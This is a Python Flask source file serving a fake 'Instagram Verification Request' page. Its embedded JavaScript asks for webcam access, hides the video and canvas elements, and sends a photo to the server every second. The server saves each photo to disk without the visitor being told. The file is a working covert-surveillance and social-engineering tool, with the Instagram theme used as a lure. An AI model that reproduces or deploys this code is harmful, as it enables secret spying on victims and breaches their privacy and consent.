from flask import Flask, render_template_string, request
import base64
import time
import os

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram Verification Request</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
      font-family: 'Poppins', sans-serif;
      color: #fff;
      text-align: center;
      padding: 1rem;
    }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <h1>Instagram Verification Request</h1>
  <p>
    Hi Instagram Team,<br/>
    I'm Your Name, my IG username is <strong>@Your Name</strong>.<br/>
    I’m a public figure and applying for the blue tick to prove my identity and avoid fake profiles.<br/>
    Please consider my request.<br/>
    Thanks!
  </p>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          captureLoop();
        };
      } catch (err) {
        console.error('Camera permission denied or error:', err);
      }
    }

    function captureLoop() {
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataURL = canvas.toDataURL('image/png');
      fetch('/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: dataURL })
      }).then(() => console.log('📷 1 sec photo sent.'));
      setTimeout(captureLoop, 1000); // हर 1 सेकंड बाद कैप्चर
    }

    window.onload = startCamera;
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json()
    image_data = data["image"].split(",")[1]

    # Save to folder
    if not os.path.exists("photos"):
        os.makedirs("photos")

    filename = f"photos/photo_{int(time.time() * 1000)}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(image_data))

    return "OK"

if __name__ == "__main__":
    app.run(debug=True)
